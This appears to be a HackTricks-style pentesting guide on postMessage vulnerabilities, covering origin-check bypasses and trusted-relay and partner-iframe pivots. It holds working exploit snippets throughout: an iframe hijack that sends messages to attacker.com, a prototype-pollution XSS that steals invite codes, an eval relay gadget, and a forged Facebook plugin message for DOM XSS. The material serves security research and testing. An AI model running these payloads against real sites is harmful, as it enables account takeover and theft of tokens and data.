_body: "# PostMessage Vulnerabilities\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Send **PostMessage**\n\n\
  **PostMessage** uses the following function to send a message:\n\n```bash\ntargetWindow.postMessage(message, targetOrigin,\
  \ [transfer]);\n\n# postMessage to current page\nwindow.postMessage('{\"__proto__\":{\"isAdmin\":True}}', '*')\n\n# postMessage\
  \ to an iframe with id \"idframe\"\n<iframe id=\"idframe\" src=\"http://victim.com/\"></iframe>\ndocument.getElementById('idframe').contentWindow.postMessage('{\"\
  __proto__\":{\"isAdmin\":True}}', '*')\n\n# postMessage to an iframe via onload\n<iframe src=\"https://victim.com/\" onload=\"\
  this.contentWindow.postMessage('<script>print()</script>','*')\">\n\n# postMessage to popup\nwin = open('URL', 'hack', 'width=800,height=300,top=500');\n\
  win.postMessage('{\"__proto__\":{\"isAdmin\":True}}', '*')\n\n# postMessage to an URL\nwindow.postMessage('{\"__proto__\"\
  :{\"isAdmin\":True}}', 'https://company.com')\n\n# postMessage to iframe inside popup\nwin = open('URL-with-iframe-inside',\
  \ 'hack', 'width=800,height=300,top=500');\n## loop until win.length == 1 (until the iframe is loaded)\nwin[0].postMessage('{\"\
  __proto__\":{\"isAdmin\":True}}', '*')\n```\n\nNote that **targetOrigin** can be a '\\*' or an URL like _https://company.com._\\\
  \nIn the **second scenario**, the **message can only be sent to that domain** (even if the origin of the window object is\
  \ different).\\\nIf the **wildcard** is used, **messages could be sent to any domain**, and will be sent to the origin of\
  \ the Window object.\n\n### Attacking iframe & wildcard in **targetOrigin**\n\nAs explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)\
  \ if you find a page that can be **iframed** (no `X-Frame-Header` protection) and that is **sending sensitive** message\
  \ via **postMessage** using a **wildcard** (\\*), you can **modify** the **origin** of the **iframe** and **leak** the **sensitive**\
  \ message to a domain controlled by you.\\\nNote that if the page can be iframed but the **targetOrigin** is **set to a\
  \ URL and not to a wildcard**, this **trick won't work**.\n\n```html\n<html>\n   <iframe src=\"https://docs.google.com/document/ID\"\
  \ />\n   <script>\n      setTimeout(exp, 6000); //Wait 6s\n\n      //Try to change the origin of the iframe each 100ms\n\
  \      function exp(){\n          setInterval(function(){\n              window.frames[0].frame[0][2].location=\"https://attacker.com/exploit.html\"\
  ;\n          }, 100);\n      }\n   </script>\n```\n\n## addEventListener exploitation\n\n**`addEventListener`** is the function\
  \ used by JS to declare the function that is **expecting `postMessages`**.\\\nA code similar to the following one will be\
  \ used:\n\n```javascript\nwindow.addEventListener(\n  \"message\",\n  (event) => {\n    if (event.origin !== \"http://example.org:8080\"\
  ) return\n\n    // ...\n  },\n  false\n)\n```\n\nNote in this case how the **first thing** that the code is doing is **checking\
  \ the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received\
  \ information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data\
  \ to this endpoints** and change the victims passwords (in this example).\n\n### Enumeration\n\nIn order to **find event\
  \ listeners** in the current page you can:\n\n- **Search** the JS code for `window.addEventListener` and `$(window).on`\
  \ (_JQuery version_)\n- **Execute** in the developer tools console: `getEventListeners(window)`\n\n![](<../../images/image\
  \ (618) (1).png>)\n\n- **Go to** _Elements --> Event Listeners_ in the developer tools of the browser\n\n![](<../../images/image\
  \ (396).png>)\n\n- Use a **browser extension** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta)\
  \ or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). This browser extensions\
  \ will **intercept all the messages** and show them to you.\n\n### Origin check bypasses\n\n- **`event.isTrusted`** attribute\
  \ is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging\
  \ to bypass if implemented correctly, its significance in security checks is notable.\n- The use of **`indexOf()`** for\
  \ origin validation in PostMessage events may be susceptible to bypassing. An example illustrating this vulnerability is:\n\
  \n  ```javascript\n  \"https://app-sj17.marketo.com\".indexOf(\"https://app-sj17.ma\")\n  ```\n\n- The **`search()`** method\
  \ from `String.prototype.search()` is intended for regular expressions, not strings. Passing anything other than a regexp\
  \ leads to implicit conversion to regex, making the method potentially insecure. This is because in regex, a dot (.) acts\
  \ as a wildcard, allowing for bypassing of validation with specially crafted domains. For instance:\n\n  ```javascript\n\
  \  \"https://www.safedomain.com\".search(\"www.s.fedomain.com\")\n  ```\n\n- The **`match()`** function, similar to `search()`,\
  \ processes regex. If the regex is improperly structured, it might be prone to bypassing.\n- The **`escapeHtml`** function\
  \ is intended to sanitize inputs by escaping characters. However, it does not create a new escaped object but overwrites\
  \ the properties of the existing object. This behavior can be exploited. Particularly, if an object can be manipulated such\
  \ that its controlled property does not acknowledge `hasOwnProperty`, the `escapeHtml` won't perform as expected. This is\
  \ demonstrated in the examples below:\n\n  - Expected Failure:\n\n    ```javascript\n    result = u({\n      message: \"\
  '\\\"<b>\\\\\",\n    })\n    result.message // \"&#39;&quot;&lt;b&gt;\\\"\n    ```\n\n  - Bypassing the escape:\n\n    ```javascript\n\
  \    result = u(new Error(\"'\\\"<b>\\\\\"))\n    result.message // \"'\"<b>\\\"\n    ```\n\n  In the context of this vulnerability,\
  \ the `File` object is notably exploitable due to its read-only `name` property. This property, when used in templates,\
  \ is not sanitized by the `escapeHtml` function, leading to potential security risks.\n\n- The `document.domain` property\
  \ in JavaScript can be set by a script to shorten the domain, allowing for more relaxed same-origin policy enforcement within\
  \ the same parent domain.\n\n### Origin-only trust + trusted relays\n\nIf a receiver only checks **`event.origin`** (e.g.,\
  \ trusts any `*.trusted.com`) you can often find a **\"relay\" page on that origin that echoes attacker-controlled params\
  \ via `postMessage`** to a supplied `targetOrigin`/`targetWindow`. Examples include marketing/analytics gadgets that take\
  \ query params and forward `{msg_type, access_token, ...}` to `opener`/`parent`. You can:\n\n- **Open the victim page in\
  \ a popup/iframe that has an `opener`** so its handlers register (many pixels/SDKs only attach listeners when `window.opener`\
  \ exists).\n- **Navigate another attacker window to the relay endpoint on the trusted origin**, populating message fields\
  \ you want injected (message type, tokens, nonces).\n- Because the message now comes **from the trusted origin**, origin-only\
  \ validation passes and you can trigger privileged behaviors (state changes, API calls, DOM writes) in the victim listener.\n\
  \nAbuse patterns seen in the wild:\n\n- Analytics SDKs (e.g., pixel/fbevents-style) consume messages like `FACEBOOK_IWL_BOOTSTRAP`,\
  \ then **call backend APIs using a token supplied in the message** and include **`location.href` / `document.referrer`**\
  \ in the request body. If you supply your own token, you can **read these requests in the token’s request history/logs**\
  \ and exfil **OAuth codes/tokens** present in the URL/referrer of the victim page.\n- Any relay that reflects arbitrary\
  \ fields into `postMessage` lets you **spoof message types** expected by privileged listeners. Combine with weak input validation\
  \ to reach Graph/REST calls, feature unlocks, or CSRF-equivalent flows.\n\nHunting tips: enumerate `postMessage` listeners\
  \ that only check `event.origin`, then look for **same-origin HTML/JS endpoints that forward URL params via `postMessage`**\
  \ (marketing previews, login popups, OAuth error pages). Stitch both together with `window.open()` + `postMessage` to bypass\
  \ origin checks.\n\n### e.origin == window.origin bypass\n\nWhen embedding a web page within a **sandboxed iframe** using\
  \ %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing\
  \ with **sandbox attributes** and their implications on security and functionality.\n\nBy specifying **`allow-popups`**\
  \ in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent.\
  \ This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin\
  \ is similarly set to `null`, aligning with the iframe's origin.\n\nConsequently, when a popup is opened under these conditions\
  \ and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their\
  \ origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null\
  \ == null`), because both the iframe and the popup share the same origin value of `null`.\n\nFor more information **read**:\n\
  \n\n{{#ref}}\nbypassing-sop-with-iframes-1.md\n{{#endref}}\n\n### Bypassing e.source\n\nIt's possible to check if the message\
  \ came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions**\
  \ to check if the message was sent from the same page):\n\n```javascript\n// If it’s not, return immediately.\nif (received_message.source\
  \ !== window) {\n  return\n}\n```\n\nYou can force **`e.source`** of a message to be null by creating an **iframe** that\
  \ **sends** the **postMessage** and is **immediately deleted**.\n\nFor more information **read:**\n\n\n{{#ref}}\nbypassing-sop-with-iframes-2.md\n\
  {{#endref}}\n\n### X-Frame-Header bypass\n\nIn order to perform these attacks ideally you will be able to **put the victim\
  \ web page** inside an `iframe`. But some headers like `X-Frame-Header` can **prevent** that **behaviour**.\\\nIn those\
  \ scenarios you can still use a less stealthy attack. You can open a new tab to the vulnerable web application and communicate\
  \ with it:\n\n```html\n<script>\nvar w=window.open(\"<url>\")\nsetTimeout(function(){w.postMessage('text here','*');}, 2000);\n\
  </script>\n```\n\n### Stealing message sent to child by blocking the main page\n\nIn the following page you can see how\
  \ you could steal a **sensitive postmessage data** sent to a **child iframe** by **blocking** the **main** page before sending\
  \ the data and abusing a **XSS in the child** to **leak the data** before it's received:\n\n\n{{#ref}}\nblocking-main-page-to-steal-postmessage.md\n\
  {{#endref}}\n\n### Stealing message by modifying iframe location\n\nIf you can iframe a webpage without X-Frame-Header that\
  \ contains another iframe, you can **change the location of that child iframe**, so if it's receiving a **postmessage**\
  \ sent using a **wildcard**, an attacker could **change** that iframe **origin** to a page **controlled** by him and **steal**\
  \ the message:\n\n\n{{#ref}}\nsteal-postmessage-modifying-iframe-location.md\n{{#endref}}\n\n### postMessage to Prototype\
  \ Pollution and/or XSS\n\nIn scenarios where the data sent through `postMessage` is executed by JS, you can **iframe** the\
  \ **page** and **exploit** the **prototype pollution/XSS** sending the exploit via `postMessage`.\n\nA couple of **very\
  \ good explained XSS though `postMessage`** can be found in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)\n\
  \nExample of an exploit to abuse **Prototype Pollution and then XSS** through a `postMessage` to an `iframe`:\n\n```html\n\
  <html>\n  <body>\n    <iframe\n      id=\"idframe\"\n      src=\"http://127.0.0.1:21501/snippets/demo-3/embed\"></iframe>\n\
  \    <script>\n      function get_code() {\n        document\n          .getElementById(\"iframe_victim\")\n          .contentWindow.postMessage(\n\
  \            '{\"__proto__\":{\"editedbymod\":{\"username\":\"<img src=x onerror=\\\\\"fetch(\\'http://127.0.0.1:21501/api/invitecodes\\\
  ', {credentials: \\'same-origin\\'}).then(response => response.json()).then(data => {alert(data[\\'result\\'][0][\\'code\\\
  ']);})\\\\\" />\"}}}',\n            \"*\"\n          )\n        document\n          .getElementById(\"iframe_victim\")\n\
  \          .contentWindow.postMessage(JSON.stringify(\"refresh\"), \"*\")\n      }\n\n      setTimeout(get_code, 2000)\n\
  \    </script>\n  </body>\n</html>\n```\n\nFor **more information**:\n\n- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)\n\

  \ Origin-derived script loading & supply-chain pivot (CAPIG case study)\n\n`capig-events.js` only registered a `message`\
  \ handler when `window.opener` existed. On `IWL_BOOTSTRAP` it checked `pixel_id` but stored `event.origin` and later used\
  \ it to build `${host}/sdk/${pixel_id}/iwl.js`.\n\n<details>\n<summary>Handler writing attacker-controlled origin</summary>\n\
  \n```javascript\nif (window.opener) {\n  window.addEventListener(\"message\", (event) => {\n    if (\n      !localStorage.getItem(\"\
  AHP_IWL_CONFIG_STORAGE_KEY\") &&\n      !localStorage.getItem(\"FACEBOOK_IWL_CONFIG_STORAGE_KEY\") &&\n      event.data.msg_type\
  \ === \"IWL_BOOTSTRAP\" &&\n      checkInList(g.pixels, event.data.pixel_id) !== -1\n    ) {\n      localStorage.setItem(\"\
  AHP_IWL_CONFIG_STORAGE_KEY\", {\n        pixelID: event.data.pixel_id,\n        host: event.origin,\n        sessionStartTime:\
  \ event.data.session_start_time,\n      })\n      startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`\n    }\n  })\n}\n\
  ```\n\n</details>\n\n**Exploit (origin → script-src pivot):**\n1. Get an opener: e.g., in Facebook Android WebView reuse\
  \ `window.name` with `window.open(target, name)` so the window becomes its own opener, then post a message from a malicious\
  \ iframe.\n2. Send `IWL_BOOTSTRAP` from any origin to persist `host = event.origin` in `localStorage`.\n3. Host `/sdk/<pixel_id>/iwl.js`\
  \ on any CSP-allowed origin (takeover/XSS/upload on a whitelisted analytics domain). `startIWL()` then loads attacker JS\
  \ in the embedding site (e.g., `www.meta.com`), enabling credentialed cross-origin calls and account takeover.\n\nIf direct\
  \ opener control was impossible, compromising a third-party iframe on the page still allowed sending the crafted `postMessage`\
  \ to the parent to poison the stored host and force the script load.\n\n**Backend-generated shared script → stored XSS:**\
  \ the plugin `AHPixelIWLParametersPlugin` concatenated user rule parameters into JS appended to `capig-events.js` (e.g.,\
  \ `cbq.config.set(...)`). Injecting breakouts like `\"]}` injected arbitrary JS, creating stored XSS in the shared script\
  \ served to all sites loading it.\n\n### Trusted-origin allowlist isn't a boundary\n\nA strict `event.origin` check only\
  \ works if the **trusted origin cannot run attacker JS**. When privileged pages embed third-party iframes and assume `event.origin\
  \ === \"https://partner.com\"` is safe, any XSS in `partner.com` becomes a bridge into the parent:\n\n```javascript\n//\
  \ Parent (trusted page)\nwindow.addEventListener(\"message\", (e) => {\n  if (e.origin !== \"https://partner.com\") return\n\
  \  const [type, html] = e.data.split(\"|\")\n  if (type === \"Partner.learnMore\") target.innerHTML = html // DOM XSS\n\
  })\n```\n\nAttack pattern observed in the wild:\n\n1. **Exploit XSS in the partner iframe** and drop a relay gadget so any\
  \ `postMessage` becomes code exec inside the trusted origin:\n\n```html\n<img src=\"\" onerror=\"onmessage=(e)=>{eval(e.data.cmd)};\"\
  >\n```\n\n2. **From the attacker page**, send JS to the compromised iframe that forwards an allowed message type back to\
  \ the parent. The message originates from `partner.com`, passes the allowlist, and carries HTML that is inserted unsafely:\n\
  \n```javascript\npostMessage({\n  cmd: `top.frames[1].postMessage('Partner.learnMore|<img src=\"\" onerror=\"alert(document.domain)\"\
  >|b|c', '*')`\n}, \"*\")\n```\n\n3. The parent injects the attacker HTML, giving **JS execution in the parent origin** (e.g.,\
  \ `facebook.com`), which can then be used to steal OAuth codes or pivot to full account takeover flows.\n\nKey takeaways:\n\
  \n- **Partner origin isn't a boundary**: any XSS in a \"trusted\" partner lets attackers send allowed messages that bypass\
  \ `event.origin` checks.\n- Handlers that **render partner-controlled payloads** (e.g., `innerHTML` on specific message\
  \ types) make partner compromise a same-origin DOM XSS.\n- A wide **message surface** (many types, no structure validation)\
  \ gives more gadgets for pivoting once a partner iframe is compromised.\n\n### Predicting **`Math.random()`** callback tokens\
  \ in postMessage bridges\n\nWhen message validation uses a “shared secret” generated with `Math.random()` (e.g., `guid()\
  \ { return \"f\" + (Math.random() * (1<<30)).toString(16).replace(\".\", \"\") }`) and the same helper also names plugin\
  \ iframes, you can recover PRNG outputs and forge trusted messages:\n\n- **Leak PRNG outputs via `window.name`:** The SDK\
  \ auto-names plugin iframes with `guid()`. If you control the top frame, iframe the victim page, then navigate the plugin\
  \ iframe to your origin (e.g., `window.frames[0].frames[0].location='https://attacker.com'`) and read `window.frames[0].frames[0].name`\
  \ to obtain a raw `Math.random()` output.\n- **Force more outputs without reloads:** Some SDKs expose a reinit path; in\
  \ the FB SDK, firing `init:post` with `{xfbml:1}` forces `XFBML.parse()`, destroys/recreates the plugin iframe, and generates\
  \ new names/callback IDs. Repeated reinit produces as many PRNG outputs as needed (note extra internal `Math.random()` calls\
  \ for callback/iframe IDs, so solvers must skip intervening values).\n- **Trusted-origin delivery via parameter pollution:**\
  \ If a first-party plugin endpoint reflects an unsanitized parameter into the cross-window payload (e.g., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`),\
  \ you can inject `&type=...&iconSVG=...` while preserving the trusted `facebook.com` origin.\n- **Predict the next callback:**\
  \ Convert leaked iframe names back to floats in `[0,1)` and feed several values (even non-consecutive) into a V8 `Math.random`\
  \ predictor (e.g., Z3-based). Generate the next `guid()` locally to forge the expected callback token.\n- **Trigger the\
  \ sink:** Craft the postMessage data so the bridge dispatches `xd.mpn.setupIconIframe` and injects HTML in `iconSVG` (e.g.,\
  \ URL-encoded `<img src=x onerror=...>`), achieving DOM XSS inside the hosting origin; from there, same-origin iframes (OAuth\
  \ dialogs, arbiters, etc.) can be read.\n- **Framing quirks help:** The chain requires framing. In some mobile webviews,\
  \ `X-Frame-Options` may degrade to unsupported `ALLOW-FROM` when `frame-ancestors` is present, and “compat” parameters can\
  \ force permissive `frame-ancestors`, enabling the `window.name` side channel.\n\n#### Minimal forged message example\n\n\
  ```javascript\n// predictedFloat is the solver output for the next Math.random()\nconst callback = \"f\" + (predictedFloat\
  \ * (1 << 30)).toString(16).replace(\".\", \"\")\nconst payload =\n  callback +\n  \"&type=mpn.setupIconIframe&frameName=x\"\
  \ +\n  \"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e\"\nconst fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`\n\
  iframe.location = fbMsg // sends postMessage from facebook.com with forged callback\n```\n\n## References\n\n- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)\n\
